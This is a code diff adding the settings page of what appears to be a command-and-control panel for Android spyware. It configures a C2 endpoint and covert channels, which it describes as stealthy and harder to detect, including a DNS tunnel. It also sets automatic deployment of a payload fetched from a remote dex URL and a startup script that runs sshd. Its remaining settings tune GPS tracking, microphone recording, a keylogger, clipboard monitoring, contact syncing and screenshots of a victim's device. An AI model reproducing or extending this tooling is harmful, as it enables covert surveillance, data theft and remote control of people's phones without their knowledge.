@@ -1,0 +1,259 @@
+<div class="space-y-6">
+    <!-- Connection Settings -->
+    <div class="glass rounded-xl p-6">
+        <h3 class="text-white font-semibold text-lg mb-4 flex items-center gap-2">
+            <svg class="w-5 h-5 text-accent-blue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4 4a4 4 0 00-5.656 5.656l-1.1-1.1"/></svg>
+            Connection Settings
+        </h3>
+        <div class="grid grid-cols-2 gap-4">
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">C2 Endpoint URL</label>
+                <input type="text" id="settingC2Url" value="" placeholder="https://your-ngrok-url.ngrok-free.dev">
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Connection Method</label>
+                <select id="settingConnMethod">
+                    <option value="socketio" selected>Socket.IO (Recommended)</option>
+                    <option value="websocket">WebSocket (Faster)</option>
+                    <option value="https">HTTPS Polling (Stealthier)</option>
+                    <option value="dns">DNS Tunnel (Most Stealthy)</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Heartbeat Interval (sec)</label>
+                <input type="number" id="settingHeartbeat" value="30" min="5" max="300">
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Reconnect Delay (sec)</label>
+                <input type="number" id="settingReconnect" value="5" min="1" max="60">
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Connection Timeout (sec)</label>
+                <input type="number" id="settingTimeout" value="10" min="3" max="60">
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">SSL Certificate Verification</label>
+                <select id="settingSSLVerify">
+                    <option value="true">Verify (Recommended)</option>
+                    <option value="false">Skip Verification</option>
+                </select>
+            </div>
+        </div>
+        <div class="mt-4 p-3 bg-slate-800/30 rounded-lg">
+            <h4 class="text-white font-medium text-sm mb-2">Connection Methods</h4>
+            <div class="grid grid-cols-2 gap-3 text-xs">
+                <div class="p-2 rounded bg-slate-800/50">
+                    <div class="text-accent-blue font-medium">Socket.IO</div>
+                    <div class="text-slate-400">Bidirectional, auto-reconnect. Best for stability.</div>
+                </div>
+                <div class="p-2 rounded bg-slate-800/50">
+                    <div class="text-accent-green font-medium">WebSocket</div>
+                    <div class="text-slate-400">Lower latency, raw TCP. Good for speed.</div>
+                </div>
+                <div class="p-2 rounded bg-slate-800/50">
+                    <div class="text-accent-amber font-medium">HTTPS Polling</div>
+                    <div class="text-slate-400">Periodic HTTP requests. Harder to detect.</div>
+                </div>
+                <div class="p-2 rounded bg-slate-800/50">
+                    <div class="text-accent-purple font-medium">DNS Tunnel</div>
+                    <div class="text-slate-400">Data encoded in DNS queries. Most stealthy.</div>
+                </div>
+            </div>
+        </div>
+        <button onclick="saveConnectionSettings()" class="btn-primary text-sm mt-4">Save Connection Settings</button>
+    </div>
+
+    <!-- Payload Settings -->
+    <div class="glass rounded-xl p-6">
+        <h3 class="text-white font-semibold text-lg mb-4 flex items-center gap-2">
+            <svg class="w-5 h-5 text-accent-green" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg>
+            Payload Settings
+        </h3>
+        <div class="grid grid-cols-2 gap-4">
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Alpine Rootfs Path</label>
+                <input type="text" value="/data/data/com.etechd.l3mon/files/alpine/root" disabled class="opacity-50">
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Auto-deploy Payload on Connect</label>
+                <select id="settingAutoDeploy">
+                    <option value="true" selected>Yes</option>
+                    <option value="false">No</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Payload Dex URL (for remote deployment)</label>
+                <input type="text" id="settingPayloadUrl" placeholder="https://your-server.com/payload.dex">
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Startup Script</label>
+                <input type="text" id="settingStartupScript" placeholder="apk add nmap; sshd -p 2222">
+            </div>
+        </div>
+        <button onclick="savePayloadSettings()" class="btn-primary text-sm mt-4">Save Payload Settings</button>
+    </div>
+
+    <!-- Function Settings -->
+    <div class="glass rounded-xl p-6">
+        <h3 class="text-white font-semibold text-lg mb-4 flex items-center gap-2">
+            <svg class="w-5 h-5 text-accent-amber" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4"/></svg>
+            Function Settings
+        </h3>
+        <div class="grid grid-cols-2 lg:grid-cols-3 gap-4">
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">GPS Poll Interval (sec)</label>
+                <input type="number" id="settingGpsInterval" value="300" min="60" max="3600">
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Mic Record Chunk (sec)</label>
+                <input type="number" id="settingMicChunk" value="2" min="1" max="30">
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Keylogger Buffer Size</label>
+                <input type="number" id="settingKeylogBuffer" value="50" min="10" max="500">
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Auto-sync Contacts</label>
+                <select id="settingAutoSyncContacts">
+                    <option value="true" selected>Yes</option>
+                    <option value="false">No</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Clipboard Monitor</label>
+                <select id="settingClipboardMonitor">
+                    <option value="true" selected>Enabled</option>
+                    <option value="false">Disabled</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Screenshot Quality</label>
+                <select id="settingScreenshotQuality">
+                    <option value="100">High (100%)</option>
+                    <option value="80" selected>Medium (80%)</option>
+                    <option value="50">Low (50%)</option>
+                </select>
+            </div>
+        </div>
+        <button onclick="saveFunctionSettings()" class="btn-primary text-sm mt-4">Save Function Settings</button>
+    </div>
+
+    <!-- UI Theme Settings -->
+    <div class="glass rounded-xl p-6">
+        <h3 class="text-white font-semibold text-lg mb-4 flex items-center gap-2">
+            <svg class="w-5 h-5 text-accent-purple" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 21a4 4 0 01-4-4V5a2 2 0 012-2h4a2 2 0 012 2v12a4 4 0 01-4 4zm0 0h12a2 2 0 002-2v-4a2 2 0 00-2-2h-2.343M11 7.343l1.657-1.657a2 2 0 012.828 0l2.829 2.829a2 2 0 010 2.828l-8.486 8.485M7 17h.01"/></svg>
+            UI Theme
+        </h3>
+        <div class="grid grid-cols-2 lg:grid-cols-4 gap-4">
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Accent Color</label>
+                <select id="settingAccentColor">
+                    <option value="#3b82f6" selected>Blue (Default)</option>
+                    <option value="#10b981">Green</option>
+                    <option value="#8b5cf6">Purple</option>
+                    <option value="#f59e0b">Amber</option>
+                    <option value="#ef4444">Red</option>
+                    <option value="#06b6d4">Cyan</option>
+                    <option value="#ec4899">Pink</option>
+                    <option value="#14b8a6">Teal</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Background</label>
+                <select id="settingBgTheme">
+                    <option value="dark" selected>Dark</option>
+                    <option value="midnight">Midnight</option>
+                    <option value="ocean">Ocean</option>
+                    <option value="forest">Forest</option>
+                    <option value="sunset">Sunset</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Sidebar Position</label>
+                <select id="settingSidebar">
+                    <option value="left" selected>Left</option>
+                    <option value="right">Right</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-slate-400 text-sm mb-1">Compact Mode</label>
+                <select id="settingCompact">
+                    <option value="false" selected>Normal</option>
+                    <option value="true">Compact</option>
+                </select>
+            </div>
+        </div>
+        <div class="mt-4">
+            <label class="block text-slate-400 text-sm mb-2">Accent Color Preview</label>
+            <div class="flex gap-2">
+                <div class="w-8 h-8 rounded-full cursor-pointer border-2 border-transparent hover:border-white" style="background:#3b82f6" onclick="previewAccent('#3b82f6')"></div>
+                <div class="w-8 h-8 rounded-full cursor-pointer border-2 border-transparent hover:border-white" style="background:#10b981" onclick="previewAccent('#10b981')"></div>
+                <div class="w-8 h-8 rounded-full cursor-pointer border-2 border-transparent hover:border-white" style="background:#8b5cf6" onclick="previewAccent('#8b5cf6')"></div>
+                <div class="w-8 h-8 rounded-full cursor-pointer border-2 border-transparent hover:border-white" style="background:#f59e0b" onclick="previewAccent('#f59e0b')"></div>
+                <div class="w-8 h-8 rounded-full cursor-pointer border-2 border-transparent hover:border-white" style="background:#ef4444" onclick="previewAccent('#ef4444')"></div>
+                <div class="w-8 h-8 rounded-full cursor-pointer border-2 border-transparent hover:border-white" style="background:#06b6d4" onclick="previewAccent('#06b6d4')"></div>
+                <div class="w-8 h-8 rounded-full cursor-pointer border-2 border-transparent hover:border-white" style="background:#ec4899" onclick="previewAccent('#ec4899')"></div>
+                <div class="w-8 h-8 rounded-full cursor-pointer border-2 border-transparent hover:border-white" style="background:#14b8a6" onclick="previewAccent('#14b8a6')"></div>
+            </div>
+        </div>
+        <button onclick="saveThemeSettings()" class="btn-primary text-sm mt-4">Save Theme Settings</button>
+    </div>
+</div>
+
+<script>
+    function previewAccent(color) {
+        document.documentElement.style.setProperty('--accent-color', color);
+        document.querySelectorAll('.bg-accent-blue').forEach(el => {
+            el.style.background = color;
+        });
+    }
+    function saveConnectionSettings() {
+        var settings = {
+            c2Url: $('#settingC2Url').val(),
+            connectionMethod: $('#settingConnMethod').val(),
+            heartbeat: $('#settingHeartbeat').val(),
+            reconnectDelay: $('#settingReconnect').val()
+        };
+        $.post('/manage/<%= deviceID %>/settings', { section: 'connection', settings: JSON.stringify(settings) }, function(d) {
+            if (d.error) showNotification('#f03434', d.error);
+            else showNotification('#2ecc71', 'Connection settings saved');
+        });
+    }
+    function savePayloadSettings() {
+        var settings = {
+            autoDeploy: $('#settingAutoDeploy').val(),
+            payloadUrl: $('#settingPayloadUrl').val(),
+            startupScript: $('#settingStartupScript').val()
+        };
+        $.post('/manage/<%= deviceID %>/settings', { section: 'payload', settings: JSON.stringify(settings) }, function(d) {
+            if (d.error) showNotification('#f03434', d.error);
+            else showNotification('#2ecc71', 'Payload settings saved');
+        });
+    }
+    function saveFunctionSettings() {
+        var settings = {
+            gpsInterval: $('#settingGpsInterval').val(),
+            micChunk: $('#settingMicChunk').val(),
+            keylogBuffer: $('#settingKeylogBuffer').val(),
+            autoSyncContacts: $('#settingAutoSyncContacts').val(),
+            clipboardMonitor: $('#settingClipboardMonitor').val(),
+            screenshotQuality: $('#settingScreenshotQuality').val()
+        };
+        $.post('/manage/<%= deviceID %>/settings', { section: 'functions', settings: JSON.stringify(settings) }, function(d) {
+            if (d.error) showNotification('#f03434', d.error);
+            else showNotification('#2ecc71', 'Function settings saved');
+        });
+    }
+    function saveThemeSettings() {
+        var settings = {
+            accentColor: $('#settingAccentColor').val(),
+            bgTheme: $('#settingBgTheme').val(),
+            sidebarPosition: $('#settingSidebar').val(),
+            compact: $('#settingCompact').val()
+        };
+        $.post('/manage/<%= deviceID %>/settings', { section: 'theme', settings: JSON.stringify(settings) }, function(d) {
+            if (d.error) showNotification('#f03434', d.error);
+            else showNotification('#2ecc71', 'Theme settings saved');
+        });
+    }
+</script>
